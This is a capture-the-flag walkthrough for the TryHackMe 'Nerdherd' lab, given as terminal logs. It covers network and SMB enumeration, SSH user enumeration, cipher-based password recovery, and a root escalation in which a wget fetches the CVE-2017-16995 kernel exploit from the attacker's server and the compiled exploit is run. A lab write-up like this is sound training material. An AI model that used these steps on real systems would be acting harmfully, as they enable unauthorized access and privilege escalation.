IP: 10.10.167.174

Nmap scan results:

root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nerdherd# nmap -A -T4 10.10.167.174
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-03 11:26 IST
Nmap scan report for 10.10.167.174
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11 03:45 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.81.62
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 0c:84:1b:36:b2:a2:e1:11:dd:6a:ef:42:7b:0d:bb:43 (RSA)
|   256 e2:5d:9e:e7:28:ea:d3:dd:d4:cc:20:86:a3:df:23:b8 (ECDSA)
|_  256 ec:be:23:7b:a9:4c:21:85:bc:a8:db:0e:7c:39:de:49 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/3%OT=21%CT=1%CU=40082%PV=Y%DS=2%DC=T%G=Y%TM=5FA0F14
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=102%GCD=1%ISR=109%TI=Z%CI=I%TS=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O
OS:3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m15s, median: 0s
|_nbstat: NetBIOS name: NERDHERD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nerdherd
|   NetBIOS computer name: NERDHERD\x00
|   Domain name: \x00
|   FQDN: nerdherd
|_  System time: 2020-11-03T07:57:14+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-11-03T05:57:14
|_  start_date: N/A


fijbxslz

root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nerdherd# cat hellon3rd.txt
all you need is in the leet


S-1-22-1-1000 Unix User\chuck (Local User)
S-1-22-1-1002 Unix User\ftpuser (Local User)


 ==============================
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck    Name: ChuckBartowski    Desc:

user:[chuck] rid:[0x3e8]


root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nerdherd# enum4linux 10.10.167.174
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Nov  3 11:29:32 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.167.174
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 10.10.167.174    |
 =====================================================
[+] Got domain/workgroup name: WORKGROUP

 =============================================
|    Nbtstat Information for 10.10.167.174    |
 =============================================
Looking up status of 10.10.167.174
        NERDHERD        <00> -         B <ACTIVE>  Workstation Service
        NERDHERD        <03> -         B <ACTIVE>  Messenger Service
        NERDHERD        <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================
|    Session Check on 10.10.167.174    |
 ======================================
[+] Server 10.10.167.174 allows sessions using username '', password ''

 ============================================
|    Getting domain SID for 10.10.167.174    |
 ============================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =======================================
|    OS information on 10.10.167.174    |
 =======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.167.174 from smbclient:
[+] Got OS info for 10.10.167.174 from srvinfo:
        NERDHERD       Wk Sv PrQ Unx NT SNT nerdherd server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ==============================
|    Users on 10.10.167.174    |
 ==============================
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck    Name: ChuckBartowski    Desc:

user:[chuck] rid:[0x3e8]

 ==========================================
|    Share Enumeration on 10.10.167.174    |
 ==========================================

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        nerdherd_classified Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.167.174
//10.10.167.174/print$  Mapping: DENIED, Listing: N/A
//10.10.167.174/nerdherd_classified     Mapping: DENIED, Listing: N/A
//10.10.167.174/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 =====================================================
|    Password Policy Information for 10.10.167.174    |
 =====================================================


[+] Attaching to 10.10.167.174 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] NERDHERD
        [+] Builtin

[+] Password Info for Domain: NERDHERD

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ===============================
|    Groups on 10.10.167.174    |
 ===============================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================
|    Users on 10.10.167.174 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2306820301-2176855359-2727674639
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\chuck (Local User)
S-1-22-1-1002 Unix User\ftpuser (Local User)
[+] Enumerating users using SID S-1-5-21-2306820301-2176855359-2727674639 and logon username '', password ''

S-1-5-21-2306820301-2176855359-2727674639-513 NERDHERD\None (Domain Group)
S-1-5-21-2306820301-2176855359-2727674639-514 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-515 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-516 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-517 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-518 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-519 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-520 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-521 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-522 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-523 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-524 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-525 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-548 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-549 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-550 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1000 NERDHERD\chuck (Local User)
S-1-5-21-2306820301-2176855359-2727674639-1001 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1002 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1003 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1004 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1005 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1006 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1007 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1008 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1009 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1010 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1011 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1012 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1013 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1014 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1015 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1016 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1017 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1018 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1019 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1020 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1021 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1022 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1023 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1024 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1025 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1026 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1027 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1028 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1029 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1030 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1031 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1032 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1033 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-1034 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)


 ==============================================
|    Getting printer info for 10.10.167.174    |
 ==============================================
No printers returned.


enum4linux complete on Tue Nov  3 11:40:47 2020


root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nerdherd# nmap -sV -p 1337  10.10.208.107
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-03 12:41 IST
Nmap scan report for 10.10.208.107
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.46 seconds
root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nerdherd#


!--
        keep digging, mister/ma'am
 -->


<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>.</p>


msf6 auxiliary(scanner/ssh/ssh_enumusers) > set username cibartowski
username => cibartowski
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 10.10.172.179
rhosts => 10.10.172.179
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 10.10.172.179:22 - SSH - Using malformed packet technique
[*] 10.10.172.179:22 - SSH - Starting scan
[+] 10.10.172.179:22 - SSH - User 'cibartowski' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_enumusers) >


these might help:
                Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
-->


https://www.youtube.com/watch?v=Vjf0CI2MZd0


Characters highlighted in green could change if the input is surrounded by more data.
Characters highlighted in red are for padding purposes only.
Unhighlighted characters are static.
Hover over the static sections to see what they decode to on their own.

Offset 0: aGVoZWdvdTwdasddHlvdRA==
Offset 1: AGhlaGVnb3U8HWrHXR5b3UQ=
Offset 2: AABoZWhlZ291PB1qx10eW91E

root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nerdherd# exiftool youfoundme.png
ExifTool Version Number         : 12.06
File Name                       : youfoundme.png

Owner Name                      : fijbxslz
Image Size                      : 894x894
Megapixels                      : 0.799


Owner name is encrypted with vignere cipher.
We can use birdistheword(That youtube video from the website) to decode that cipher.


easypass - This is the decrypted string and we can use this as password for smb.


root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nerdherd# smbclient //10.10.216.102/nerdherd_classified
Enter WORKGROUP\root's password:
tree connect failed: NT_STATUS_ACCESS_DENIED
root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nerdherd# smbclient //10.10.216.102/nerdherd_classified -U "chuck"
Enter WORKGROUP\chuck's password:
Try "help" to get a list of possible commands.
smb: \>


We knew that the user was chuck on the machine.

smb: \> get secr3t.txt
getting file \secr3t.txt of size 125 as secr3t.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit
root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nerdherd# cat secr3t.txt
Ssssh! don't tell this anyone because you deserved it this far:

        check out "/this1sn0tadirect0ry"

Sincerely,
        0xpr0N3rd
<3
root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nerdherd#


http://10.10.216.102:1337/this1sn0tadirect0ry/creds.txt

alright, enough with the games.

here, take my ssh creds:

        chuck : th1s41ntmypa5s

root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nerdherd# ssh chuck@10.10.216.102
The authenticity of host '10.10.216.102 (10.10.216.102)' can't be established.
ECDSA key fingerprint is SHA256:Zf9lZPGnZpw5EjeSwBXbXbeyTILyhw998cnd87rFDTU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.216.102' (ECDSA) to the list of known hosts.
chuck@10.10.216.102's password:
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

745 packages can be updated.
515 updates are security updates.

Last login: Tue Sep 22 21:02:19 2020 from 22.0.97.11


chuck@nerdherd:~$ id
uid=1000(chuck) gid=1000(chuck) groups=1000(chuck),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
chuck@nerdherd:~$




chuck@nerdherd:/opt$ cat .root.txt
nOOt nOOt! you've found the real flag, congratz!

THM{5c5b7f0a81ac1c0073##################}
chuck@nerdherd:/opt$


chuck@nerdherd:/tmp$ ./les.sh

Available information:

Kernel version: 4.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 16.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

74 kernel space exploits
45 user space exploits

Possible Exploits:

[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1



Download the exploit and compile it using gcc.

chuck@nerdherd:/tmp$ wget http://10.9.81.62:8000/45010
--2020-11-05 10:31:42--  http://10.9.81.62:8000/45010
Connecting to 10.9.81.62:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13728 (13K) [application/octet-stream]
Saving to: ‘45010’

45010                                         100%[===============================================================================================>]  13,41K  79,4KB/s    in 0,2s

2020-11-05 10:31:42 (79,4 KB/s) - ‘45010’ saved [13728/13728]

chuck@nerdherd:/tmp$ mv 45010 exploit.c


chuck@nerdherd:/tmp$ gcc exploit.c -o get_me_root
chuck@nerdherd:/tmp$ ./get_me_root
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff880019393300
[*] Leaking sock struct from ffff88001921ad00
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88001b1d7900
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88001b1d7900
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(chuck)
#


# cd /root
# ls
root.txt
# cat root.txt
cmon, wouldnt it be too easy if i place the root flag here?

# cat .bash_history

cp youfoundme.png /home/chuck/Desktop/
ls -la
rm youfoundme.png
THM{a975c295ddeab5b1######################}
mv /home/chuck/Downloads/youfoundme.png .
rm youfoundme.png
mv /home/chuck/Downloads/youfoundme.png .
clear


Thank you... Happy Hacking :)
